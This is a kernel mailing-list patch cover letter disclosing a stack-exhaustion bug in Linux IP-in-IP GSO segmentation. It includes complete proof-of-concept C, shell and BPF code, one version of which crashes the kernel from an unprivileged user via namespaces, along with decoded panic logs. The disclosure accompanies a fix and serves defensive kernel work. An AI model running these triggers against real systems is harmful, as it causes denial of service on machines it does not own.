Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6CD3537B032
	for <netdev@vger.kernel.org>; Sun, 13 Sep 2026 14:12:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789308751; cv=none; b=JOAc2/0cXd4NUdJ6BBcQ+Q8wZ45256qJ/yKk8F5Ow0ZWyZMAKhu6du/vzLP5xsYittOOPxbt6ve2G0WEhmnaRDXFia0j3QAVozlPVlC4RD37KrYfkMVuYqALo5GGr+nq24R4kWqwmbJox0yX9VgoCmOcM6/jFrrXmO63Jta1ie4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789308751; c=relaxed/simple;
	bh=6tV+SUij4c+7ckt1li3h6UvW/G4g79TOAHNzln8aQMc=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Y/MrO0NQAceig6lEA2tUq82o2dg+5Pm52v9cmzfGR0o55BiWeLWNz7t0Ae1pdOg95F71io2cGoLPnEMtKElhA1/rim5w9WgEaxr9DIJ//XKBObZ1Fj1dc0oalgv0JEmmGF5/ZYagUrMgGEMK5IVxng9QFib+MgXNfITQFolqHSA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=aNtqGkZ7; arc=none smtp.client-ip=74.125.227.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="aNtqGkZ7"
Received: by mail-pj2-f12.google.com with SMTP id d9443c01a7336-2d8fb334e72so12863485ad.1
        for <netdev@vger.kernel.org>; Sun, 13 Sep 2026 07:12:28 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789308748; x=1789913548; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=vJJrOmmSQ/oO8c2n3uPVeeKxob4P2MhOpfNfcTMnQwM=;
        b=aNtqGkZ7QnzoIW31dD/ckCN+0wa78EQAKQzngO5RD/hS57JmjuIxgjTJulXQ5CTZsX
         Gp8woLNgSaxC+EZtiSqm+eSyfjRgyS1xLaoHSQPTSDXKrMDV+mfMyu9lrBg6JlrHBTzu
         f4ojGuhK3oijSFZRM5y+5astcL9e9roviAyCGt9SOeXXFMRIAkmSoR5RpHVf/AQtxdtD
         up0BoReny/py7sYakCunMsBDqKUn8T82NDapmWxIyGW+rOM5Sg0EPKOCxehPhvUf9kDS
         56N5OJr70Iq9cKLuXoa1JMnuqGxRQ/uFE9mEnCJt943V+1+fRFrO7ZdsP+wS6N5VOa7R
         odbw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789308748; x=1789913548;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=vJJrOmmSQ/oO8c2n3uPVeeKxob4P2MhOpfNfcTMnQwM=;
        b=FQuQvqtqfz0lqHeFc81/uYaDioWMjNOC6ba7m5h6ceToQGgoK+gkqdeSpZ0C6p8G8Q
         vRO4zsAvjnqJxYvXNGv0MoD+U/8XkNj9GCjaFYE7BHJPdXHnvGtb5KPnSoPGgFQMLYWl
         o6+lCi1BQac6HklreNxJhY7TtJIMwQM2nmEq4DQkCLdsbAVVawt1ZiBvreJ/mhGOs9Sl
         mdlBoWC0xn0DcmlZRzDhHXmFOcIvP7wLJ6RJbo3AQSH3FUWuvBsfjltp8WfVQM6aaY+g
         HPX45F8S05RjQi8dxznVDkXFbtKlVmqK5LSBXIVDitII6/IeFFLzXWlQS0z3mAQBNnS0
         O1fA==
X-Gm-Message-State: AFuF++nKgT+6s0ukrTvsxUl8y2bcSVlGL5faIzg7D0zkM/fbRoRqlXfc
	xcTgu+8IxUJ1MmuoSZEfhVRD07vHE8pmW745SiSKrm5fy4+Ss7ZJ6LgfPH64zMYe/Tjr48caev8
	FIv/sxTpA
X-Gm-Gg: AYBFou0NViSG9p5PBdhR1rRrz6rgvErFDG1rc8sSI6boWDLqj8/COR+KtG9iZEM7kGo
	1UTKdg8MbsPFMSKQhiNIY540bCNqzXvhV2P2We0uDflj32FqWRUwD0cXff8wNcjL3SwqMNbofpr
	Ee6GgQF/219YFS6+C+WzPG06lGYyEItgZumKHZJhnJlboWnoD3DPTQegifVg2JEyH4b13rAGd8J
	PwaVslWWHBr//HdIocz2Q8oR2oDbX3Gvmvxs7hkXw1Qqs3y3gjj/+x+GX/OtSWIc0cufbovzQa1
	mN09UTqV9QnIh7f7xR59kHsldWIzRln9vKK8aubMayj4FMrzpAGCXesnTCZ5CW1qLixaHMyyoNj
	Q8Ddg6VRdCrv3CjV6kj2RxbimgCMcOuCi9SXOQQwEHDaXycp9w7wLhsfRP1mCvXCOcb3IPPCrY2
	F59tPkUDkii4xu2TyL2BXwq3N9K7BH6yGq3OJgDzLW/ur5U3sTlHoG09hiPR1IzhiT6C8yY531R
	B2D9B3OXEAP/JvEXfIp8pfCGNTS5g==
X-Received: by 2002:a17:90b:2542:b0:398:c150:e7b3 with SMTP id 98e67ed59e1d1-39d9bbe548bmr23387940a91.4.1789308747245;
        Sun, 13 Sep 2026 07:12:27 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39d95752809sm15481457a91.13.2026.09.13.07.12.19
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 13 Sep 2026 07:12:26 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: linux-kernel@vger.kernel.org,
	zihanx@nebusec.ai,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	dsahern@kernel.org,
	idosch@nvidia.com,
	willemb@google.com,
	kuniyu@google.com,
	kees@kernel.org,
	richardbgobert@gmail.com,
	jiayuan.chen@linux.dev
Subject: [PATCH net 0/1] net: gso: limit recursive IP-in-IP segmentation
Date: Sun, 13 Sep 2026 14:12:11 +0000
Message-ID: <cover.1789302084.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/core/gso.c. IP-in-IP GSO can re-enter
the IPv4 or IPv6 GSO handler without a depth bound. The patch applies the
same bound to both handlers, but the reproducer and crash logs exercise only
the IPv4 path; no separate IPv6 runtime test was run. The bug is reachable by
a non-root user through private user and network namespaces. The BPF/veth
reproducer needs root in the initial user namespace; the namespace-only
reproducer starts as UID 65534. The change is expected not to affect other
functionality; recorded validation used the code-equivalent pre-comment tree
f24f5f6b2e0f. The final source change adds only a clarifying comment. No
broader regression testing was run.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.
The detailed bug information, PoC, and decoded crash output are included
below.

---- details below ----

Bug details:

An IP-in-IP GSO packet reaches inet_gso_segment() through
skb_mac_gso_segment(). Each nested IP-in-IP header causes the IPv4 or IPv6
segmenter to process the next inner header. encap_level records header bytes
but does not bound callback depth, so a sufficiently deep chain can exhaust
the kernel stack before a transport GSO handler is reached.

The patch adds a per-skb callback counter, resets it for each top-level GSO
operation, and rejects the 15th callback entry in either IP family handler.
It allows 14 callback entries to complete; GSO_RECURSION_LIMIT is the
rejection threshold. encap_level is unchanged and the existing -EINVAL
error path is used.

The unbounded callback nesting became possible when inet_gso_segment() was
made stackable by 3347c9602955 ("ipv4: gso: make inet_gso_segment()
stackable"). 68c331631143 ("v4 GRE: Add TCP segmentation offload for GRE")
only added GRE GSO support. cb32f511a70b ("ipip: add GSO/TSO support") later
expanded the reachable IP-in-IP path. The Fixes tag therefore points to
3347c9602955.

The separate netdev patch [PATCH net v4] net: reduce XMIT_RECURSION_LIMIT
under KASAN limits softnet_data.xmit.recursion; it does not touch skb_gso_cb
or the IPv4/IPv6 GSO handlers and is not an equivalent fix.

Reproducer:

BPF/veth:

    make clean all
    ./poc.sh

The Makefile used by `make clean all` is:

------BEGIN Makefile------
CC ?= gcc
CLANG ?= clang
KDIR ?=
BPF_CFLAGS ?= -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra -I/usr/include/x86_64-linux-gnu $(if $(KDIR),-I$(KDIR)/tools/lib/bpf)
CFLAGS ?= -O2 -Wall -Wextra
INSERTED_IPS ?= 199
TRIGGER_PORT ?= 4242

all: poc tc_mutate.bpf.o

poc: poc.c
	$(CC) $(CFLAGS) -o $@ $<

tc_mutate.bpf.o: tc_mutate.bpf.c
	$(CLANG) $(BPF_CFLAGS) -DINSERTED_IPS=$(INSERTED_IPS) -DTRIGGER_PORT=$(TRIGGER_PORT) -c -o $@ $<

clean:
	rm -f poc tc_mutate.bpf.o
------END Makefile--------
With KDIR unset, the BPF command is:

    clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra \
        -I/usr/include/x86_64-linux-gnu \
        -DINSERTED_IPS=199 -DTRIGGER_PORT=4242 \
        -c tc_mutate.bpf.c -o tc_mutate.bpf.o

KDIR may be set to add matching kernel tools/lib/bpf headers. Runtime
requires gcc, iproute2, ethtool, and perl. The validation guest had no
Python 3, so poc.sh selected this checked-in fallback:

    ip netns exec "$NS" "$DIR/net-server-perl.sh" &

------BEGIN net-server-perl.sh------
#!/bin/sh
exec perl -MIO::Socket::INET -e 'my $s = IO::Socket::INET->new(LocalAddr => "198.18.0.2", LocalPort => 4242, Listen => 1, ReuseAddr => 1) or die "server: $!\n"; my $c = $s->accept() or die "accept: $!\n"; my $buf; while (read($c, $buf, 65536)) {}'
------END net-server-perl.sh--------

Namespace-only:

    apt-get install -y ethtool
    cc -O2 -static -g -Wall -Wextra -o poc_privilege_optimized poc_privilege_optimized.c
    su -s /bin/sh nobody -c 'cd /tmp/q7x-ns && exec ./poc_privilege_optimized.sh 180 1400'

The package installation and compilation are setup steps. The final `su`
command starts the trigger as UID 65534; the script prints
`launcher uid=65534` before entering the private user namespace.

The fixed BPF/veth run on f24f5f6b2e0f sent 65536 bytes and returned
REMOTE_RC=0 and DMESG_RC=0. The fixed namespace-only run printed
`launcher uid=65534`, then `inside uid=0` with `uid_map: 0 65534 1`.
It returned sendmsg 3676 for the 3676-byte payload at depth 180 and
gso_size 1400, with REMOTE_RC=0 and DMESG_RC=0.

The fresh unpatched BPF/veth run used the same Perl fallback, hit the stack
guard, and returned REMOTE_RC=255 and DMESG_RC=255 after SSH was lost. The
unpatched namespace-only run as UID 65534 hit the same stack guard and
returned REMOTE_RC=255 after SSH became unavailable. These are wrapper
statuses, not kernel error codes. REMOTE_RC=0 means normal completion; 124
would mean the host-side timeout expired, but it was not reported by these
current runs.

The decoded namespace-only output is:
verify/serial-namespace-unpatched-decoded.log:

    [   11.531989] BUG: TASK stack guard page was hit at ffffb15780ae7ff8 (stack is ffffb15780ae8000..ffffb15780aec000)
    [   11.531995] CPU: 0 UID: 65534 PID: 401 Comm: poc_privilege_o Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy)
    [   11.532069]  inet_gso_segment (net/ipv4/af_inet.c:1411)
    [   11.532339]  skb_mac_gso_segment (net/core/gso.c:53)
    [   11.532405] Kernel panic - not syncing: Fatal exception in interrupt

Packetdrill is not used: this trigger needs network namespaces, IPIP
devices, tc egress BPF header insertion, and UDP_SEGMENT control data.
Packetdrill cannot express this setup.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static void usage(const char *prog)
{
	fprintf(stderr, "Usage: %s <ip> <port> <bytes>\n", prog);
}

int main(int argc, char **argv)
{
	struct sockaddr_in addr;
	char *buf;
	unsigned long port;
	unsigned long total;
	size_t off = 0;
	int one = 1;
	int fd;

	if (argc != 4) {
		usage(argv[0]);
		return 1;
	}

	port = strtoul(argv[2], NULL, 0);
	total = strtoul(argv[3], NULL, 0);
	if (port > 65535 || total == 0) {
		fprintf(stderr, "invalid port or byte count\n");
		return 1;
	}

	buf = malloc(total);
	if (!buf) {
		perror("malloc");
		return 1;
	}
	for (off = 0; off < total; off++)
		buf[off] = 'A' + (off % 23);

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		perror("socket");
		free(buf);
		return 1;
	}

	if (setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0) {
		perror("setsockopt(TCP_NODELAY)");
		close(fd);
		free(buf);
		return 1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons((uint16_t)port);
	if (inet_pton(AF_INET, argv[1], &addr.sin_addr) != 1) {
		fprintf(stderr, "invalid IPv4 address\n");
		close(fd);
		free(buf);
		return 1;
	}

	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("connect");
		close(fd);
		free(buf);
		return 1;
	}

	off = 0;
	while (off < total) {
		ssize_t n = send(fd, buf + off, total - off, 0);

		if (n < 0) {
			perror("send");
			close(fd);
			free(buf);
			return 1;
		}
		off += (size_t)n;
	}

	fprintf(stderr, "sent %lu bytes to %s:%lu\n", total, argv[1], port);
	close(fd);
	free(buf);
	return 0;
}

------END poc.c--------
------BEGIN poc.sh------
#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)

NS=${NS:-q7xns}
OUTER_DEV0=${OUTER_DEV0:-q7xveth0}
OUTER_DEV1=${OUTER_DEV1:-q7xveth1}
OUTER0=${OUTER0:-10.10.0.1/24}
OUTER1=${OUTER1:-10.10.0.2/24}
OUTER0_IP=${OUTER0_IP:-10.10.0.1}
OUTER1_IP=${OUTER1_IP:-10.10.0.2}
TUN0=${TUN0:-q7xipip0}
TUN1=${TUN1:-q7xipip1}
INNER0_IP=${INNER0_IP:-198.18.0.1}
INNER1_IP=${INNER1_IP:-198.18.0.2}
TARGET_IP=${TARGET_IP:-198.18.0.2}
PORT=${PORT:-4242}
SEND_BYTES=${SEND_BYTES:-65536}
SERVER_PIDFILE=/tmp/q7x-server.pid

cleanup() {
	tc qdisc del dev "$OUTER_DEV0" clsact 2>/dev/null || true
	ip link del "$TUN0" 2>/dev/null || true
	ip netns del "$NS" 2>/dev/null || true
	ip link del "$OUTER_DEV0" 2>/dev/null || true
	rm -f "$SERVER_PIDFILE"
}

trap cleanup EXIT

gcc -O2 -Wall -Wextra -o "$DIR/poc" "$DIR/poc.c"
if [ ! -f "$DIR/tc_mutate.bpf.o" ]; then
	echo "missing tc_mutate.bpf.o; build it on the host with: make -C $DIR" >&2
	exit 1
fi

cleanup

ip netns add "$NS"
ip link add "$OUTER_DEV0" type veth peer name "$OUTER_DEV1"
ip link set "$OUTER_DEV1" netns "$NS"

ip addr add "$OUTER0" dev "$OUTER_DEV0"
ip link set "$OUTER_DEV0" up
ip netns exec "$NS" ip addr add "$OUTER1" dev "$OUTER_DEV1"
ip netns exec "$NS" ip link set lo up
ip netns exec "$NS" ip link set "$OUTER_DEV1" up

ethtool -K "$OUTER_DEV0" tso off gso off gro off sg off >/dev/null 2>&1 || true

ip link add "$TUN0" type ipip local "$OUTER0_IP" remote "$OUTER1_IP" dev "$OUTER_DEV0"
ip addr add "$INNER0_IP" peer "$INNER1_IP" dev "$TUN0"
ip link set "$TUN0" up

ip netns exec "$NS" ip link add "$TUN1" type ipip local "$OUTER1_IP" remote "$OUTER0_IP" dev "$OUTER_DEV1"
ip netns exec "$NS" ip addr add "$INNER1_IP" peer "$INNER0_IP" dev "$TUN1"
ip netns exec "$NS" ip link set "$TUN1" up

tc qdisc add dev "$OUTER_DEV0" clsact
tc filter add dev "$OUTER_DEV0" egress bpf da obj "$DIR/tc_mutate.bpf.o" sec tc

if command -v python3 >/dev/null 2>&1; then
    ip netns exec "$NS" python3 - <<'PY' &
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("198.18.0.2", 4242))
s.listen(1)
conn, _ = s.accept()
while conn.recv(65535):
    pass
PY
else
    echo "using Perl listener: $DIR/net-server-perl.sh" >&2
    ip netns exec "$NS" "$DIR/net-server-perl.sh" &
fi
echo $! > "$SERVER_PIDFILE"
sleep 1

"$DIR/poc" "$TARGET_IP" "$PORT" "$SEND_BYTES"
sleep 2

------END poc.sh--------
------BEGIN tc_mutate.bpf.c------
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/pkt_cls.h>
#include <linux/tcp.h>
#include <stddef.h>

#ifndef INSERTED_IPS
#define INSERTED_IPS 199
#endif

#ifndef TRIGGER_PORT
#define TRIGGER_PORT 4242
#endif

#ifndef IP_DF
#define IP_DF 0x4000
#endif

#ifndef IPPROTO_IPIP
#define IPPROTO_IPIP 4
#endif

#ifndef IPPROTO_TCP
#define IPPROTO_TCP 6
#endif

#define SEC(NAME) __attribute__((section(NAME), used))
#define bpf_htons(x) ((__be16)__builtin_bswap16((__u16)(x)))
#define bpf_ntohs(x) ((__u16)__builtin_bswap16((__u16)(x)))
#define bpf_htonl(x) ((__be32)__builtin_bswap32((__u32)(x)))

#define INSERTED_LEN (INSERTED_IPS * (__u32)sizeof(struct iphdr))

static long (*bpf_skb_load_bytes)(struct __sk_buff *skb, __u32 off,
				  void *to, __u32 len) =
	(void *)BPF_FUNC_skb_load_bytes;
static long (*bpf_skb_adjust_room)(struct __sk_buff *skb, __s32 len_diff,
				   __u32 mode, __u64 flags) =
	(void *)BPF_FUNC_skb_adjust_room;
static long (*bpf_skb_store_bytes)(struct __sk_buff *skb, __u32 off,
				   const void *from, __u32 len,
				   __u64 flags) =
	(void *)BPF_FUNC_skb_store_bytes;
static long (*bpf_l3_csum_replace)(struct __sk_buff *skb, __u32 off,
				   __u64 from, __u64 to, __u64 size) =
	(void *)BPF_FUNC_l3_csum_replace;

static __always_inline int load_bytes(struct __sk_buff *skb, __u32 off,
				      void *dst, __u32 len)
{
	return bpf_skb_load_bytes(skb, off, dst, len);
}

SEC("tc")
int mutate_gso_chain(struct __sk_buff *skb)
{
	struct iphdr outer;
	struct iphdr inner;
	struct tcphdr th;
	__u32 off = sizeof(struct ethhdr);
	__u32 ins_off = off + sizeof(struct iphdr);
	__u16 new_tot;
	int i;

	if (skb->protocol != bpf_htons(ETH_P_IP))
		return TC_ACT_OK;
	if (skb->len < 2000)
		return TC_ACT_OK;
	if (load_bytes(skb, off, &outer, sizeof(outer)) < 0)
		return TC_ACT_OK;
	if (outer.version != 4 || outer.ihl != 5 || outer.protocol != IPPROTO_IPIP)
		return TC_ACT_OK;
	if (load_bytes(skb, ins_off, &inner, sizeof(inner)) < 0)
		return TC_ACT_OK;
	if (inner.version != 4 || inner.ihl != 5 || inner.protocol != IPPROTO_TCP)
		return TC_ACT_OK;
	if (load_bytes(skb, ins_off + sizeof(inner), &th, sizeof(th)) < 0)
		return TC_ACT_OK;
	if (th.dest != bpf_htons(TRIGGER_PORT))
		return TC_ACT_OK;
	if (bpf_skb_adjust_room(skb, INSERTED_LEN, BPF_ADJ_ROOM_NET,
				BPF_F_ADJ_ROOM_FIXED_GSO |
				BPF_F_ADJ_ROOM_NO_CSUM_RESET) < 0)
		return TC_ACT_SHOT;

	new_tot = bpf_htons(bpf_ntohs(outer.tot_len) + INSERTED_LEN);
	bpf_l3_csum_replace(skb, off + offsetof(struct iphdr, check),
			    outer.tot_len, new_tot, sizeof(new_tot));
	bpf_skb_store_bytes(skb, off + offsetof(struct iphdr, tot_len),
			    &new_tot, sizeof(new_tot), 0);

	for (i = 0; i < INSERTED_IPS; i++) {
		struct iphdr iph = {};

		iph.version = 4;
		iph.ihl = 5;
		iph.ttl = 64;
		iph.protocol = IPPROTO_IPIP;
		iph.frag_off = bpf_htons(IP_DF);
		iph.id = bpf_htons((__u16)(i + 1));
		iph.saddr = bpf_htonl(0x0a010001u + (__u32)i);
		iph.daddr = bpf_htonl(0x0a020001u + (__u32)i);

		if (bpf_skb_store_bytes(skb,
					ins_off + ((__u32)i * sizeof(struct iphdr)),
					&iph, sizeof(iph), 0) < 0)
			return TC_ACT_SHOT;
	}

	return TC_ACT_OK;
}

char _license[] SEC("license") = "GPL";

------END tc_mutate.bpf.c--------
------BEGIN poc_privilege_optimized.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/udp.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef UDP_SEGMENT
#define UDP_SEGMENT 103
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

struct ipv4_min {
	uint8_t version_ihl;
	uint8_t tos;
	uint16_t tot_len;
	uint16_t id;
	uint16_t frag_off;
	uint8_t ttl;
	uint8_t protocol;
	uint16_t check;
	uint32_t saddr;
	uint32_t daddr;
} __attribute__((packed));

static void fill_ipip(struct ipv4_min *iph, unsigned int id, uint8_t protocol)
{
	memset(iph, 0, sizeof(*iph));
	iph->version_ihl = 0x45;
	iph->tot_len = htons(sizeof(*iph)); /* parser does not use this field */
	iph->id = htons((uint16_t)id);
	iph->ttl = 64;
	iph->protocol = protocol;
	iph->saddr = htonl(0x0a000001U);
	iph->daddr = htonl(0x0a000002U);
}

int main(int argc, char **argv)
{
	struct sockaddr_in bind_addr = { .sin_family = AF_INET };
	struct sockaddr_in dst = { .sin_family = AF_INET };
	struct msghdr msg = {0};
	struct iovec iov;
	unsigned char control[CMSG_SPACE(sizeof(uint16_t))];
	struct cmsghdr *cm;
	unsigned char *payload;
	unsigned int depth, segsz, payload_len, i;
	ssize_t ret;
	int fd;

	if (argc != 5) {
		fprintf(stderr, "usage: %s DEST PORT DEPTH GSO_SIZE\n", argv[0]);
		return 2;
	}
	depth = strtoul(argv[3], NULL, 0);
	segsz = strtoul(argv[4], NULL, 0);
	if (depth < 1 || depth > 3000 || segsz < 1 || segsz > 65535) {
		fprintf(stderr, "invalid depth or GSO size\n");
		return 2;
	}

	/*
	 * After tc changes the original inner IPv4 protocol UDP -> IPIP,
	 * the 8-byte UDP header and payload[0..11] are parsed as an IPv4
	 * header.  Source port 0x4500 supplies version=4, IHL=5.  payload[1]
	 * supplies protocol=IPIP.  The explicit headers start at payload+12.
	 */
	payload_len = 12 + depth * sizeof(struct ipv4_min) + 64;
	if (payload_len > 65507) {
		fprintf(stderr, "payload too large: %u\n", payload_len);
		return 2;
	}
	payload = calloc(1, payload_len);
	if (!payload) {
		perror("calloc");
		return 1;
	}
	payload[0] = 64;
	payload[1] = IPPROTO_IPIP;
	for (i = 0; i < depth; i++)
		fill_ipip((struct ipv4_min *)(payload + 12 + i * 20), i,
			  i + 1 == depth ? IPPROTO_UDP : IPPROTO_IPIP);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return 1;
	}
	bind_addr.sin_port = htons(0x4500);
	bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
		perror("bind(0x4500)");
		return 1;
	}
	if (inet_pton(AF_INET, argv[1], &dst.sin_addr) != 1) {
		fprintf(stderr, "bad destination\n");
		return 2;
	}
	dst.sin_port = htons((uint16_t)strtoul(argv[2], NULL, 0));

	iov.iov_base = payload;
	iov.iov_len = payload_len;
	msg.msg_name = &dst;
	msg.msg_namelen = sizeof(dst);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = control;
	msg.msg_controllen = sizeof(control);
	memset(control, 0, sizeof(control));
	cm = CMSG_FIRSTHDR(&msg);
	cm->cmsg_level = SOL_UDP;
	cm->cmsg_type = UDP_SEGMENT;
	cm->cmsg_len = CMSG_LEN(sizeof(uint16_t));
	*(uint16_t *)CMSG_DATA(cm) = (uint16_t)segsz;

	fprintf(stderr, "uid=%u euid=%u send UDP_SEGMENT payload=%u depth=%u gso_size=%u source_port=0x4500\n",
		(unsigned)getuid(), (unsigned)geteuid(), payload_len, depth, segsz);
	ret = sendmsg(fd, &msg, 0);
	if (ret < 0) {
		fprintf(stderr, "sendmsg: %s (%d)\n", strerror(errno), errno);
		return 1;
	}
	fprintf(stderr, "sendmsg returned %zd\n", ret);
	close(fd);
	free(payload);
	return ret == (ssize_t)payload_len ? 0 : 1;
}

------END poc_privilege_optimized.c--------
------BEGIN poc_privilege_optimized.sh------
#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH

DEPTH=${1:-180}
GSO_SIZE=${2:-4096}

echo "launcher uid=$(id -u) gid=$(id -g)"
echo "status before unshare: $(awk '/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}' /proc/self/status)"

exec unshare --user --map-root-user --net sh -eu -c '
	echo "inside uid=$(id -u) gid=$(id -g)"
	echo "uid_map: $(tr "\n" ";" </proc/self/uid_map)"
	echo "gid_map: $(tr "\n" ";" </proc/self/gid_map)"
	echo "status: $(awk '\''/^Uid:|^Gid:|^Cap/ {printf "%s ", $0}'\'' /proc/self/status)"

	ip link add q7dummy type dummy
	ip addr add 10.23.0.1/32 dev q7dummy
	ip link set q7dummy up
	ip route add 10.23.0.2/32 dev q7dummy

	ip link add q7tun type ipip local 10.23.0.1 remote 10.23.0.2 dev q7dummy
	ip addr add 198.18.7.1 peer 198.18.7.2 dev q7tun
	ip link set q7tun up

	# Make segmentation happen in software after the egress action.  Offset 29
	# is the protocol byte of the original inner IPv4 header (20 + 9).
	ethtool -K q7dummy tso off gso off gro off sg off \
		tx-ipxip4-segmentation off tx-udp-segmentation off
	tc qdisc add dev q7dummy clsact
	tc filter add dev q7dummy egress protocol ip pref 1 matchall \
		action pedit munge offset 29 u8 set 4

	./poc_privilege_optimized 198.18.7.2 9000 "$1" "$2"
' sh "$DEPTH" "$GSO_SIZE"

------END poc_privilege_optimized.sh--------

The crash log below is verify/serial-bpf-unpatched-current-decoded.log,
produced by scripts/decode_stacktrace.sh from the fresh unpatched BPF/veth
run using the 88c17de85ddb kernel and the Perl listener.

----BEGIN crash log----
[   12.155910] BUG: TASK stack guard page was hit at ffffa96040afffe8 (stack is ffffa96040b00000..ffffa96040b04000)
[   12.155914] Oops: stack guard page: 0000 [#1] SMP NOPTI
[   12.155917] CPU: 1 UID: 0 PID: 434 Comm: poc Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy) 
[   12.155919] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   12.155919] RIP: 0010:inet_gso_segment (net/ipv4/af_inet.c:1404 (discriminator 1))
[   12.155941] Code: 8e 3f 02 00 00 4d 8b 4c 24 10 4d 23 b9 00 02 00 00 41 89 7c 24 4c 66 41 89 84 24 b6 00 00 00 8b 46 18 89 c7 81 e7 00 00 00 80 <89> 7c 24 04 c1 e8 10 83 e0 01 88 04 24 4a 8b 04 c5 40 d0 ef b0 89
All code
========
   0:	8e 3f                	mov    (%rdi),%?
   2:	02 00                	add    (%rax),%al
   4:	00 4d 8b             	add    %cl,-0x75(%rbp)
   7:	4c 24 10             	rex.WR and $0x10,%al
   a:	4d 23 b9 00 02 00 00 	and    0x200(%r9),%r15
  11:	41 89 7c 24 4c       	mov    %edi,0x4c(%r12)
  16:	66 41 89 84 24 b6 00 	mov    %ax,0xb6(%r12)
  1d:	00 00 
  1f:	8b 46 18             	mov    0x18(%rsi),%eax
  22:	89 c7                	mov    %eax,%edi
  24:	81 e7 00 00 00 80    	and    $0x80000000,%edi
  2a:*	89 7c 24 04          	mov    %edi,0x4(%rsp)		<-- trapping instruction
  2e:	c1 e8 10             	shr    $0x10,%eax
  31:	83 e0 01             	and    $0x1,%eax
  34:	88 04 24             	mov    %al,(%rsp)
  37:	4a 8b 04 c5 40 d0 ef 	mov    -0x4f102fc0(,%r8,8),%rax
  3e:	b0 
  3f:	89                   	.byte 0x89

Code starting with the faulting instruction
===========================================
   0:	89 7c 24 04          	mov    %edi,0x4(%rsp)
   4:	c1 e8 10             	shr    $0x10,%eax
   7:	83 e0 01             	and    $0x1,%eax
   a:	88 04 24             	mov    %al,(%rsp)
   d:	4a 8b 04 c5 40 d0 ef 	mov    -0x4f102fc0(,%r8,8),%rax
  14:	b0 
